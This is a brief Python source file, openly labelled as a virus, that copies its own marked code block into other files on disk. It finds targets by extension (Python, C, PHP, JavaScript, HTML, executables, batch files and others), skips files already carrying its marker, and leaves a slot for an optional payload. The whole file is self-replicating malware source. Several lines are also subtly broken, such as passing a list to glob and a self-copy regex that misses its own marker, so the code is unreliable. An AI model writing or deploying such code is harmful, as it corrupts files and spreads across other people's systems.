#!/usr/bin/python


#####virus begins here
import sys, glob, re

#get copy of virus
vCode = []
fh = open(sys.argv[0], "r")
lines = fh.readlines()
fh.close()

inVirus = False
for line in lines:
    if (re.search('^####virus begins here', line)): inVirus = True
    if (inVirus): vCode.append(line)
    if (re.search('^#virus ends here', line)): break


#find potentional victims
alist = ["*py", "*.txt", "*.cpp", ".c", "*.php", "*.js", "*.html", ".css", "*.cs", "*.exe", "*.bat", "*.xml"]
progs = glob.glob(alist)

#check and infect
for prog in progs:
    fh = open(prog, "r")
    pCode = fh.readlines()
    fh.close()
    infected = False
    for line in pCode:
        if ('####virus begins here' in line):
            infected = True
            break
    if not infected:
        newCode = []
        if ('#!' in pCode[0]): newCode.append(pCode.pop(0))
        newCode.extend(vCode)
        newCode.extend(pCode)
        # writing new code
        fh = open(prog, "w")
        fh.writelines(newCode)
        fh.close

#optional payload


#virus ends here